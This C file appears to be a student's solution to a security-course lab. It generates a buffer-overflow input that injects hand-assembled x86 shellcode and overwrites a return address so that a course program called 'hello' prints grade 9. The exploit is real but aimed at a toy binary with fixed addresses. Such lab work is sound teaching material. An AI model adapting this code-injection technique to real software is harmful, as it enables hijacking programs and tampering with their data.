/*
  Name: Manos Chatzakis
  AM  : 4238
  Mail: csd4238@csd.uoc.gr
  File: createdata9.c

  This file urges hello program to print grade 9.
*/

/*
  main:
        movb $0x39, 0x80d46e8
        movb $0x8048b6f, %eax
        jmp *%eax
        ret

  0x80483cb <main>:	0xc7	0x05	0xe8	0x46	0x0d	0x08	0x39	0x00
  0x80483d3 <main+8>:	0x00	0x00	0xb8	0x6f	0x8b	0x04	0x08	0xff
  0x80483db <main+16>:	0xe0

  name address + 8 = 80D65E8
*/

#include <stdio.h>

int main(void){

  int i;

  /*Writing the name to buffer*/
  printf("Manolis");
  putchar('\0');

  /*movb $0x39, 0x80d46e8*/
  putchar(0xc7);
  putchar(0x05);
  putchar(0xe8);
  putchar(0x46);
  putchar(0x0d);
  putchar(0x08);
  putchar(0x39);
  putchar(0x00);
  putchar(0x00);
  putchar(0x00);

  /*movb $0x8048b6f, %eax*/
  putchar(0xb8);
  putchar(0x6f);
  putchar(0x8b);
  putchar(0x04);
  putchar(0x08);

  /*jmp *%eax*/
  putchar(0xff);
  putchar(0xe0);

  /*Fill the rest buffer and overwrite the 4 bytes of c variable*/
  for(i=0; i<23; i++) { putchar('\0'); }

  /*Jump to return address using indexing variable i*/
  putchar(0x38);

  /*Changing the return address*/
  putchar(0xe8);
  putchar(0x65);
  putchar(0x0d);
  putchar(0x08);

  /*Set name again*/
  putchar(0xe0);
  putchar(0x65);
  putchar(0x0d);
  putchar(0x08);

  return 0;
}
